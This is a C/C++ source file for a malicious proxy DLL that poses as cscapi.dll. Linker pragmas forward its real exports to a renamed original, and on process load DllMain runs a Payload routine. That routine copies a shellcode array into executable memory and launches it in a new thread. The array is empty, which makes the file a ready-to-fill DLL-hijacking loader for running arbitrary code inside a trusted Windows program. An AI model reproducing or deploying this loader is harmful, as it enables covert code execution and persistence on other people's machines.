#pragma once

#pragma comment(linker,"/export:CscNetApiGetInterface=cscapi_orig.CscNetApiGetInterface,@1")
#pragma comment(linker,"/export:CscSearchApiGetInterface=cscapi_orig.CscSearchApiGetInterface,@2")
#pragma comment(linker,"/export:OfflineFilesEnable=cscapi_orig.OfflineFilesEnable,@3")
#pragma comment(linker,"/export:OfflineFilesGetShareCachingMode=cscapi_orig.OfflineFilesGetShareCachingMode,@4")
#pragma comment(linker,"/export:OfflineFilesQueryStatus=cscapi_orig.OfflineFilesQueryStatus,@5")
#pragma comment(linker,"/export:OfflineFilesQueryStatusEx=cscapi_orig.OfflineFilesQueryStatusEx,@6")
#pragma comment(linker,"/export:OfflineFilesStart=cscapi_orig.OfflineFilesStart,@7")


#include <windows.h>
#include "pch.h"

VOID Payload() {
    unsigned char shellcode[] = {
 };




    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Payload();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}